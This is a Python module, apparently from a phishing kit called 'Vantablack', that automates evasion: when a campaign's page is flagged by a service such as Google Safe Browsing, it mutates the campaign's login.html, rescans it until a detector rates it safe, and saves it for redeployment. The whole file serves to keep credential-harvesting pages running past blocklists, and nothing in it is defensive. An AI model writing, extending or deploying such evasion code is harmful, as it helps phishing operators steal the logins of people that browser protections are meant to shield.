"""
Vantablack Core v5 - Autopilot Engine
=====================================

Orchestrates the feedback loop:
1. Detect signature/blocking event
2. Trigger mutation engine
3. Scan for safety
4. Redeploy campaign
"""

import asyncio
import logging
import os
from typing import Dict, Any, Optional
from core.mutation.engine import MutationEngine
from core.mutation.scanner import DetectionScanner

class Autopilot:
    def __init__(self):
        self.logger = logging.getLogger("vantablack.orchestrator.autopilot")
        self.mutator = MutationEngine()
        self.scanner = DetectionScanner()
        self.max_retries = 5
        
    async def process_event(self, event: Dict[str, Any]):
        """Handle detection event (e.g., 'Google Safe Browsing Block')"""
        if event.get("type") == "detection_alert":
            self.logger.warning(f"Detection Alert Received: {event.get('source')}")
            campaign_id = event.get("campaign_id")
            if campaign_id:
                await self.trigger_mutation_cycle(campaign_id)
            else:
                self.logger.error("Event missing campaign_id")

    async def trigger_mutation_cycle(self, campaign_id: str):
        """Execute the Mutation -> Scan -> Deploy loop"""
        self.logger.info(f"Starting mutation cycle for campaign {campaign_id}")
        
        # 1. Fetch Current Assets
        html_content = self._load_campaign_asset(campaign_id, "login.html")
        if not html_content:
            self.logger.error(f"Could not load assets for {campaign_id}")
            return

        for attempt in range(self.max_retries):
            self.logger.info(f"Mutation attempt {attempt + 1}/{self.max_retries}")
            
            # 2. Mutate
            mutated_html = self.mutator.mutate_html(html_content)
            
            # 3. Scan
            scan_result = self.scanner.scan_content(mutated_html)
            
            if scan_result["status"] == "SAFE":
                self.logger.info(f"Mutation successful (Score: {scan_result['score']}). Redeploying...")
                self._save_campaign_asset(campaign_id, "login.html", mutated_html)
                # Trigger deployment hook here
                return
            else:
                self.logger.warning(f"Mutation still risky (Score: {scan_result['score']}). Retrying...")
                await asyncio.sleep(1) # Backoff
        
        self.logger.error(f"Failed to generate safe mutation for {campaign_id} after {self.max_retries} attempts.")

    def _load_campaign_asset(self, campaign_id: str, filename: str) -> Optional[str]:
        """Load asset from disk"""
        # Assuming standard directory structure: campaigns/{id}/templates/{filename}
        path = os.path.join("campaigns", campaign_id, "templates", filename)
        if os.path.exists(path):
            with open(path, "r") as f:
                return f.read()
        
        # Fallback to global templates for testing
        fallback_path = os.path.join("templates", "safe_login.html")
        if os.path.exists(fallback_path):
             with open(fallback_path, "r") as f:
                return f.read()
                
        return None

    def _save_campaign_asset(self, campaign_id: str, filename: str, content: str):
        """Save mutated asset to disk"""
        path = os.path.join("campaigns", campaign_id, "templates", filename)
        # Ensure directory exists
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
        self.logger.info(f"Saved mutated asset to {path}")
